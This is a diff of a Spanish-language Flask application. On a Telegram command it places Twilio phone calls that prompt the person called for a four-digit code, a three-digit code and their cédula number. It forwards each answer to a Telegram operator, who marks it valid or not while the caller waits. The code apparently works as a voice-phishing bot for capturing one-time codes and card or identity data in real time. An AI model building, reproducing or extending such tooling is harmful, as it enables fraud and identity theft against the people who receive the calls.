@@ -27,7 +27,6 @@ logger.addHandler(file_handler)
 
 app = Flask(__name__)
 
-
 # ⚙️ Configuración desde variables de entorno
 TWILIO_ACCOUNT_SID = os.getenv('TWILIO_ACCOUNT_SID')
 TWILIO_AUTH_TOKEN = os.getenv('TWILIO_AUTH_TOKEN')
@@ -39,32 +38,27 @@ TELEGRAM_CHAT_ID = os.getenv('TELEGRAM_CHAT_ID')
 
 client = Client(TWILIO_ACCOUNT_SID, TWILIO_AUTH_TOKEN)
 
-# Diccionario para almacenar sesiones de usuario - hacemos que sea global para asegurar persistencia
+# Diccionario para almacenar sesiones de usuario
 global_user_sessions = {}
 processed_message_ids = set()
+
+call_status_messages_sent = {}
+call_final_states = {'completed', 'failed', 'busy', 'no-answer', 'canceled'}
 
 # Variable para controlar el polling de Telegram
 telegram_polling_active = False
 last_update_id = 0
 
-# BASE_URL = os.getenv('BASE_URL', 'https://8f89-190-84-119-217.ngrok-free.app')
-# logger.info(f"🌐 URL base configurada: {BASE_URL}")
-
 def absolute_url(path):
     """Genera una URL absoluta sin depender del contexto de solicitud."""
-    # Si estamos en un contexto de solicitud, usar la URL raíz
     if flask.has_request_context():
         base = request.url_root
     else:
-        # Si no hay contexto de solicitud, usar la URL base configurada
         base = os.getenv('BASE_URL', 'https://call-telegram-production.up.railway.app')
         if not base.endswith('/'):
             base += '/'
     
-    # Asegurarnos que el path esté sin / inicial para unirlo correctamente
     path = path.lstrip('/')
-    
-    # Generar y loguear la URL completa para depuración
     full_url = base + path
     logger.info(f"🔗 URL generada: {full_url}")
     
@@ -100,8 +94,6 @@ global_user_sessions = load_sessions_from_file()
 @app.route('/')
 def index():
     return "Servidor de llamadas y verificación activo."
-
-
 
 @app.route('/make-call')
 def make_call():
@@ -143,8 +135,6 @@ def make_call():
         logger.error(f"❌ ERROR AL INICIAR LLAMADA: {e}")
         return jsonify({"status": "error", "message": str(e)}), 500
 
-# Función auxiliar para identificar llamadas desde Telegram
-
 @app.route('/call-status-callback', methods=['POST'])
 def call_status_callback():
     """Endpoint para recibir actualizaciones de estado de llamada desde Twilio."""
@@ -159,8 +149,15 @@ def call_status_callback():
         logger.warning(f"⚠️ Recibida actualización para SID desconocido: {call_sid}")
         global_user_sessions[call_sid] = {}
     
-    # Guardar el estado y la hora de la actualización
+    # Obtener el estado anterior
     last_status = global_user_sessions[call_sid].get('call_status')
+    
+    # Solo procesar si el estado realmente cambió
+    if call_status == last_status:
+        logger.info(f"🔄 Estado duplicado ignorado para SID={call_sid}: {call_status}")
+        return jsonify({"status": "ok"})
+    
+    # Guardar el estado y la hora de la actualización
     global_user_sessions[call_sid]['call_status'] = call_status
     global_user_sessions[call_sid]['last_update'] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
     global_user_sessions[call_sid]['call_duration'] = call_duration
@@ -174,53 +171,72 @@ def call_status_callback():
     # Verificar si la llamada fue iniciada desde Telegram
     telegram_chat_id = global_user_sessions[call_sid].get('telegram_chat_id')
     
-    # Evitar duplicar notificación inicial para llamadas desde Telegram
-    skip_initial_notification = (call_status == "initiated" and telegram_chat_id and last_status is None)
+    # Controlar duplicación de mensajes usando el diccionario de control
+    message_key = f"{call_sid}_{call_status}"
     
-    # Solo enviar notificación si el estado ha cambiado Y no es una duplicación
-    if call_status != last_status and not skip_initial_notification:
-        # Definir un icono según el estado
-        status_icon = "📞"
-        status_desc = "Estado actualizado"
-        
-        if call_status == "initiated":
-            status_icon = "🔄"
-            status_desc = "Llamada iniciada"
-        elif call_status == "ringing":
-            status_icon = "📳"
-            status_desc = "Teléfono sonando"
-        elif call_status == "in-progress":
-            status_icon = "✅"
-            status_desc = "Llamada contestada"
-        elif call_status == "completed":
-            status_icon = "🏁"
-            status_desc = "Llamada finalizada"
-        elif call_status == "busy":
-            status_icon = "🔴"
-            status_desc = "Número ocupado"
-        elif call_status == "no-answer":
-            status_icon = "❌"
-            status_desc = "Sin respuesta"
-        elif call_status == "failed":
-            status_icon = "⚠️"
-            status_desc = "Llamada fallida"
-        elif call_status == "canceled":
-            status_icon = "🚫"
-            status_desc = "Llamada cancelada"
-        
-        # Crear mensaje de notificación
-        message = f"{status_icon} <b>{status_desc}</b>\nSID: {call_sid}\nNúmero: {to_number}\nEstado: {call_status}"
-        
-        # Añadir duración si está disponible y no es cero
-        if call_status in ["completed", "in-progress"] and call_duration != '0':
-            message += f"\nDuración: {call_duration}s"
-        
-        # Enviar notificación a Telegram
-        send_to_telegram(message)
-        
-        # Si hay un chat_id específico guardado, enviar también la notificación allí
-        if telegram_chat_id:
-            send_telegram_response(telegram_chat_id, message)
+    # Si ya enviamos este mensaje de estado para este SID, no lo enviamos de nuevo
+    if message_key in call_status_messages_sent:
+        logger.info(f"🚫 Mensaje de estado ya enviado para {call_sid}: {call_status}")
+        return jsonify({"status": "ok"})
+    
+    # Marcar este mensaje como enviado
+    call_status_messages_sent[message_key] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+    
+    # Limpiar mensajes antiguos del diccionario de control (mantener solo los últimos 50)
+    if len(call_status_messages_sent) > 50:
+        items = list(call_status_messages_sent.items())
+        call_status_messages_sent.clear()
+        call_status_messages_sent.update(dict(items[-25:]))
+    
+    # Definir un icono según el estado
+    status_icon = "📞"
+    status_desc = "Estado actualizado"
+    
+    if call_status == "initiated":
+        status_icon = "🔄"
+        status_desc = "Llamada iniciada"
+    elif call_status == "ringing":
+        status_icon = "📳"
+        status_desc = "Teléfono sonando"
+    elif call_status == "in-progress":
+        status_icon = "✅"
+        status_desc = "Llamada contestada"
+    elif call_status == "completed":
+        status_icon = "🏁"
+        status_desc = "Llamada finalizada"
+    elif call_status == "busy":
+        status_icon = "🔴"
+        status_desc = "Número ocupado"
+    elif call_status == "no-answer":
+        status_icon = "❌"
+        status_desc = "Sin respuesta"
+    elif call_status == "failed":
+        status_icon = "⚠️"
+        status_desc = "Llamada fallida"
+    elif call_status == "canceled":
+        status_icon = "🚫"
+        status_desc = "Llamada cancelada"
+    
+    # Crear mensaje de notificación
+    message = f"{status_icon} <b>{status_desc}</b>\nSID: {call_sid}\nNúmero: {to_number}\nEstado: {call_status}"
+    
+    # Añadir duración si está disponible y no es cero
+    if call_status in ["completed"] and call_duration != '0':
+        message += f"\nDuración: {call_duration}s"
+    
+    # Enviar notificación a Telegram
+    send_to_telegram(message)
+    
+    # Si hay un chat_id específico guardado, enviar también la notificación allí
+    if telegram_chat_id:
+        send_telegram_response(telegram_chat_id, message)
+    
+    # Si es un estado final, limpiar recursos relacionados con esta llamada
+    if call_status in call_final_states:
+        logger.info(f"🧹 Limpiando recursos para llamada finalizada: {call_sid}")
+        keys_to_remove = [key for key in call_status_messages_sent.keys() if key.startswith(call_sid)]
+        for key in keys_to_remove:
+            call_status_messages_sent.pop(key, None)
     
     return jsonify({"status": "ok"})
 
@@ -347,13 +363,11 @@ def step3():
     gather = Gather(num_digits=10, action='/save-step3', method='POST', timeout=30, finish_on_key='')
     gather.say("Por favor ingrese su número de cédula.", language='es-ES')
     gather.pause(length=1)
-    gather.say("Ingrese su número de cédula de 10 dígitos ahora.", language='es-ES')
+    gather.say("Ingrese su número de cédula de 10 o 7 dígitos ahora.", language='es-ES')
     response.append(gather)
     
     response.redirect('/step3')
     return str(response)
-
-# save-step3 para usar la ruta de espera
 
 @app.route('/save-step3', methods=['POST'])
 def save_step3():
@@ -416,29 +430,6 @@ def save_step3():
     response.redirect(f"/waiting-validation?CallSid={call_sid}&wait=8&revalidation={str(is_revalidation).lower()}")
     return str(response)
 
-
-# ruta para re-verificación específica
-@app.route('/reverify', methods=['POST', 'GET'])
-def reverify():
-    """
-    Ruta para cuando se necesita volver a verificar todos los datos.
-    """
-    call_sid = request.values.get('CallSid')
-    logger.info(f"🔄 SOLICITANDO RE-VERIFICACIÓN PARA SID={call_sid}")
-    
-    response = VoiceResponse()
-    response.say("Sus datos requieren una nueva verificación. Esto puede tomar un momento.", language='es-ES')
-    response.say("Estamos procesando sus códigos y documento de identidad. Por favor espere.", language='es-ES')
-    
-    # Enviar una notificación al operador de Telegram
-    if call_sid and call_sid in global_user_sessions:
-        data = global_user_sessions[call_sid]
-        msg = f"🔄 Solicitando RE-VERIFICACIÓN:\n🔢 Código 4 dígitos: {data.get('code4', 'N/A')}\n🔢 Código 3 dígitos: {data.get('code3', 'N/A')}\n🆔 Cédula: {data.get('cedula', 'N/A')}\n\nResponde con:\n/validar {call_sid} 1 1 1 (si todos están bien)"
-        send_to_telegram(msg)
-    
-    response.redirect(f"/waiting-validation?CallSid={call_sid}&wait=10")
-    return str(response)
-
 @app.route('/validate-result', methods=['GET', 'POST'])
 def validate_result():
     call_sid = request.values.get('sid')
@@ -455,10 +446,6 @@ def validate_result():
         response = VoiceResponse()
         response.say("Lo sentimos, hubo un error en la validación. Finalizando llamada.", language='es-ES')
         return str(response)
-    
-    # Imprime todas las sesiones para depuración
-    logger.info(f"⚠️ SESIONES ACTUALES: {list(global_user_sessions.keys())}")
-    logger.info(f"⚠️ BUSCANDO SID: {call_sid}")
     
     # Verificar si SID existe en sesiones
     if call_sid not in global_user_sessions:
@@ -545,10 +532,9 @@ def validate_result():
 def waiting_validation():
     """
     Ruta específica para mostrar un mensaje de espera mientras se validan los datos.
-    Permite especificar un tiempo de espera y redirecciona al resultado de validación.
     """
     call_sid = request.values.get('CallSid')
-    wait_time = int(request.values.get('wait', 10))  # Tiempo de espera reducido a 10 segundos por defecto
+    wait_time = int(request.values.get('wait', 10))
     is_revalidation = request.values.get('revalidation', 'false').lower() == 'true'
     
     logger.info(f"⏳ ESPERANDO VALIDACIÓN PARA SID={call_sid}, TIEMPO={wait_time}s, REVALIDACIÓN={is_revalidation}")
@@ -560,7 +546,7 @@ def waiting_validation():
         response.say("Lo sentimos, hubo un error en el proceso. Finalizando llamada.", language='es-ES')
         return str(response)
     
-    # Verificar inmediatamente si ya hay una validación (para evitar esperas innecesarias)
+    # Verificar inmediatamente si ya hay una validación
     if call_sid in global_user_sessions and 'validacion' in global_user_sessions[call_sid]:
         logger.info(f"⚠️ VALIDACIÓN YA EXISTENTE PARA SID={call_sid}: {global_user_sessions[call_sid]['validacion']}")
         response = VoiceResponse()
@@ -590,170 +576,9 @@ def waiting_validation():
         logger.info(f"✅ VALIDACIÓN DETECTADA DURANTE LA PAUSA PARA SID={call_sid}")
         response.redirect(f"/validate-result?sid={call_sid}")
     else:
-        # Redirigir a la verificación de resultados después de la espera
         response.redirect(f"/validate-result?sid={call_sid}")
     
     return str(response)
-
-# Función para revalidar datos específicos
-@app.route('/revalidate/<data_type>', methods=['POST', 'GET'])
-def revalidate_data(data_type):
-    """
-    Permite revalidar un tipo específico de dato (code4, code3 o cedula).
-    """
-    call_sid = request.values.get('CallSid')
-    
-    if not call_sid:
-        logger.error("❌ No se pudo obtener el CallSid para revalidación")
-        response = VoiceResponse()
-        response.say("Lo sentimos, hubo un error en el proceso. Finalizando llamada.", language='es-ES')
-        return str(response)
-        
-    logger.info(f"🔄 REVALIDANDO {data_type} PARA SID={call_sid}")
-    
-    response = VoiceResponse()
-    
-    # Mensaje personalizado según el tipo de dato a revalidar
-    if data_type == 'code4':
-        response.say("Necesitamos verificar nuevamente el primer código de cuatro dígitos.", language='es-ES')
-        response.redirect('/step1')
-    elif data_type == 'code3':
-        response.say("Necesitamos verificar nuevamente el segundo código de tres dígitos.", language='es-ES')
-        response.redirect('/step2')
-    elif data_type == 'cedula':
-        response.say("Necesitamos verificar nuevamente su número de cédula de identidad.", language='es-ES')
-        response.redirect('/step3')
-    elif data_type == 'all':
-        # Si se solicita revalidar todo, reiniciamos el contador de intentos
-        if call_sid in global_user_sessions:
-            count_key = f"{call_sid}_retry_count"
-            if count_key in global_user_sessions[call_sid]:
-                global_user_sessions[call_sid][count_key] = 0
-                save_session_to_file(global_user_sessions)
-                logger.info(f"🔄 REINICIADO CONTADOR DE INTENTOS PARA SID={call_sid}")
-        
-        response.say("Necesitamos reiniciar el proceso de verificación.", language='es-ES')
-        response.say("Por favor, proporcione nuevamente toda su información.", language='es-ES')
-        response.redirect('/step1')
-    else:
-        response.say("Lo sentimos, no se reconoce qué dato necesita verificación.", language='es-ES')
-        response.redirect(f"/validate-result?sid={call_sid}")
-    
-    return str(response)
-
-# Endpoint adicional para verificación con tiempo personalizado
-@app.route('/verify-with-timeout', methods=['POST', 'GET'])
-def verify_with_timeout():
-    """
-    Permite especificar un tiempo personalizado para la espera de validación.
-    Útil cuando el operador necesita más tiempo.
-    """
-    call_sid = request.values.get('CallSid')
-    wait_time = request.values.get('wait', '20')  # Tiempo en segundos, por defecto 20
-    
-    try:
-        wait_time = int(wait_time)
-    except ValueError:
-        wait_time = 20  # Valor predeterminado si hay error
-    
-    response = VoiceResponse()
-    
-    # Mensaje personalizado para esperas largas
-    if wait_time > 30:
-        response.say("La verificación requiere un tiempo adicional. Le agradecemos su paciencia.", language='es-ES')
-        response.say("Estamos trabajando para procesar sus datos correctamente.", language='es-ES')
-    else:
-        response.say("Estamos procesando su información. Por favor, espere un momento.", language='es-ES')
-    
-    # Añadir una música o sonido para esperas largas podría ser apropiado
-    response.pause(length=wait_time)
-    response.redirect(f"/validate-result?sid={call_sid}")
-    
-    # Notificar al operador sobre esta espera prolongada
-    if call_sid in global_user_sessions:
-        send_to_telegram(f"⏱️ Espera prolongada establecida para SID={call_sid}: {wait_time} segundos")
-    
-    return str(response)
-
-@app.route('/manual-validar', methods=['GET'])
-def manual_validar():
-    """
-    Permite validar directamente desde la web:
-    /manual-validar?sid=XXX&code4=1&code3=1&cedula=1
-    """
-    sid = request.args.get('sid')
-    code4 = int(request.args.get('code4', 1))
-    code3 = int(request.args.get('code3', 1))
-    cedula = int(request.args.get('cedula', 1))
-    
-    if not sid:
-        return jsonify({"error": "Se requiere el parámetro 'sid'"})
-    
-    # Asegurar que la sesión existe para este SID
-    if sid not in global_user_sessions:
-        global_user_sessions[sid] = {}
-        logger.info(f"🆕 Creada nueva sesión para SID={sid} en manual-validar")
-    
-    global_user_sessions[sid]['validacion'] = [code4, code3, cedula]
-    save_session_to_file(global_user_sessions)
-    
-    logger.info(f"⚠️ VALIDACIÓN MANUAL GUARDADA PARA SID {sid}: [{code4}, {code3}, {cedula}]")
-    return jsonify({"status": "ok", "message": f"Validación guardada para {sid}"})
-
-@app.route('/validar', methods=['POST', 'GET'])
-def validar():
-    """
-    Se espera que el operador escriba en Telegram:
-    /validar <call_sid> 1 1 0
-    """
-    # Obtiene el texto del comando de manera más robusta
-    text = ''
-    if request.method == 'GET':
-        text = request.args.get('text', '')
-    else:  # POST
-        if request.is_json:
-            text = request.json.get('text', '')
-        else:
-            text = request.values.get('text', '')
-    
-    logger.info(f"⚠️ VALIDAR RECIBIDO: {text}")
-    
-    return process_validation_command(text)
-
-def process_validation_command(text):
-    """Procesa un comando de validación y devuelve el resultado."""
-    # Soportar tanto "/validar" como "validar" (sin slash)
-    if text.startswith('/validar') or text.startswith('validar'):
-        parts = text.split()
-        logger.info(f"⚠️ PARTES DEL COMANDO: {parts}")
-        
-        if len(parts) >= 5:
-            # El formato esperado es: ['/validar', 'CALL_SID', '1', '1', '1']
-            cmd = parts[0]
-            sid = parts[1]
-            
-            try:
-                vals = list(map(int, parts[2:5]))
-                logger.info(f"⚠️ VALIDACIÓN PARA SID {sid}: {vals}")
-                
-                # Asegurar que la sesión existe para este SID
-                if sid not in global_user_sessions:
-                    global_user_sessions[sid] = {}
-                    logger.info(f"🆕 Creada nueva sesión para SID={sid} en process_validation_command")
-                
-                # Guardar la validación
-                global_user_sessions[sid]['validacion'] = vals
-                save_session_to_file(global_user_sessions)
-                
-                logger.info(f"⚠️ VALIDACIÓN GUARDADA PARA SID {sid} EN WEBAPI")
-                return jsonify({"status": "ok", "message": "Validación guardada"})
-                
-            except Exception as e:
-                logger.error(f"❌ ERROR AL PROCESAR VALIDACIÓN: {e}")
-                return jsonify({"error": f"Error al procesar: {e}"})
-    
-    logger.warning("⚠️ FORMATO INCORRECTO EN VALIDAR")
-    return jsonify({"error": "Formato incorrecto"})
 
 def redirect_twiml(url_path):
     """Atajo para redirección de Twilio."""
@@ -762,7 +587,7 @@ def redirect_twiml(url_path):
     return str(response)
 
 def send_to_telegram(message):
-    """Envía mensaje a Telegram y espera la validación."""
+    """Envía mensaje a Telegram."""
     url = f'https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage'
     data = {'chat_id': TELEGRAM_CHAT_ID, 'text': message, 'parse_mode': 'HTML'}
     try:
@@ -778,7 +603,6 @@ def is_call_from_telegram(call_sid):
     """Verifica si una llamada fue iniciada desde Telegram."""
     return (call_sid in global_user_sessions and 
             'telegram_chat_id' in global_user_sessions[call_sid])
-
 
 def send_telegram_response(chat_id, text):
     """Envía una respuesta directa a un chat de Telegram."""
@@ -841,7 +665,6 @@ def process_telegram_update(update):
         
         # Si el conjunto es demasiado grande, limpiar los más antiguos
         if len(processed_message_ids) > 100:
-            # Mantener solo los últimos 50 IDs
             processed_message_ids = set(list(processed_message_ids)[-50:])
         
         logger.info(f"📨 MENSAJE DE TELEGRAM RECIBIDO: {message_text}")
@@ -876,10 +699,6 @@ def process_telegram_update(update):
                     save_session_to_file(global_user_sessions)
                     
                     logger.info(f"✅ VALIDACIÓN GUARDADA PARA SID {sid} MEDIANTE TELEGRAM: {vals}")
-                    
-                    # Mostrar todas las sesiones para depuración
-                    logger.info(f"📊 SESIONES ACTUALES: {list(global_user_sessions.keys())}")
-                    logger.info(f"📊 DATOS DE SESIÓN PARA {sid}: {global_user_sessions.get(sid, {})}")
                     
                     # Confirmar al usuario de Telegram
                     send_telegram_response(chat_id, f"<b>✅ Validación guardada para {sid}:</b> {vals}")
@@ -922,7 +741,7 @@ def process_call_command(chat_id, message_text):
             url=url,
             status_callback=status_callback_url,
             status_callback_method='POST',
-            status_callback_event=['initiated', 'ringing', 'answered', 'completed', 'busy', 'no-answer', 'failed']
+            status_callback_event=['initiated', 'ringing', 'answered', 'completed', 'busy', 'no-answer', 'failed', 'canceled']
         )
 
         # Inicializar la sesión para el nuevo SID con estado inicial
@@ -930,16 +749,18 @@ def process_call_command(chat_id, message_text):
             'call_status': 'initiated',
             'to_number': phone_number,
             'initiated_time': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
-            'telegram_chat_id': chat_id  # Guardar el chat_id para notificaciones posteriores
+            'telegram_chat_id': chat_id
         }
         save_session_to_file(global_user_sessions)
         
         logger.info(f"📞 Nueva llamada iniciada desde Telegram: SID={call.sid}, Número={phone_number}")
         
-        # Confirmar al usuario de Telegram (solo una notificación)
-        send_telegram_response(chat_id, f"✅ <b>Llamada iniciada al número {phone_number}</b>\nSID: {call.sid}\nEstado: Iniciando...")
+        # Confirmar al usuario de Telegram
+        send_telegram_response(chat_id, f"🚀 <b>Llamada iniciada</b>\nNúmero: {phone_number}\nSID: {call.sid}\n\n⏳ Esperando estados de la llamada...")
         
-        # NO enviar notificación duplicada aquí - el callback se encargará de las actualizaciones
+        # Marcar que ya enviamos la confirmación inicial para este SID
+        initial_message_key = f"{call.sid}_initiated"
+        call_status_messages_sent[initial_message_key] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
         
         return True
         
@@ -986,46 +807,6 @@ def stop_telegram_polling():
         logger.info("🛑 Solicitud para detener polling de Telegram recibida")
         return True
     return False
-
-@app.route('/start-polling')
-def api_start_polling():
-    """API para iniciar manualmente el polling de Telegram."""
-    result = start_telegram_polling()
-    return jsonify({"status": "ok", "started": result})
-
-@app.route('/stop-polling')
-def api_stop_polling():
-    """API para detener manualmente el polling de Telegram."""
-    result = stop_telegram_polling()
-    return jsonify({"status": "ok", "stopped": result})
-
-@app.route('/polling-status')
-def api_polling_status():
-    """API para verificar el estado del polling de Telegram."""
-    return jsonify({
-        "status": "ok", 
-        "polling_active": telegram_polling_active,
-        "last_update_id": last_update_id
-    })
-
-@app.route('/sessions')
-def api_sessions():
-    """API para ver todas las sesiones activas."""
-    return jsonify({
-        "status": "ok",
-        "sessions_count": len(global_user_sessions),
-        "sessions": global_user_sessions
-    })
-
-@app.route('/clear-sessions')
-def api_clear_sessions():
-    """API para limpiar todas las sesiones."""
-    global global_user_sessions
-    global_user_sessions = {}
-    save_session_to_file(global_user_sessions)
-    return jsonify({"status": "ok", "message": "Sesiones eliminadas"})
-
-# ----- FIN DE FUNCIONALIDAD -----
 
 if __name__ == '__main__':
     # Cargar sesiones previas
